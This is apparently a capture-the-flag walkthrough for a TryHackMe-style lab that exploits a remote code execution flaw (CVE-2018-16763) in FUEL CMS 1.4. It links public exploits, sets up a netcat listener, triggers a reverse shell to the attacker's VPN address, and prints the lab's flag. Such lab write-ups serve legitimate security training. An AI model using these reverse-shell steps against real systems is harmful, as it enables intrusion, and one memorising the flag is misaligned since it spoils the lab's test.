1. Run the machine and wait for 5 minutes :)

2. If we simply open the given ipaddress in the browser, we can see a page of an application with the name [FUEL CMS].

3. The version of this application is also given [1.4].

4. Search on google for the remote code execution vulnerabilies in the version 1.4 of FUEL CMS. The cve is [CVE-2018-16763].

5. Click the button after discovering more exploits :)

6. After checking exploits on exploit-db: [https://www.exploit-db.com/exploits/50477], this was one that may work. But unfortunately after trying it, it was showing errors. As we were also warned in the task-5, we should look for some other ones. So i just found this one [https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py]. First setup a port to get the shell [nc -lvnp PORT]. Run this exploit [python3 exploit.py <IP_ADDRESS>]. Then enter [shell_me]. Then enter [YOUR_THM_VPN_IP:PORT]. This will give you the shell on the nc that you set up. Run [pwd] to see the current directory. Since we have to move to the [/home/ubuntu], run [cd ../../../../home/ubuntu]. Now [ls] to see, and it has the [flag.txt] file. [cat flag.txt] will give us the flag [THM{ACKME_BLOG_HACKED}].
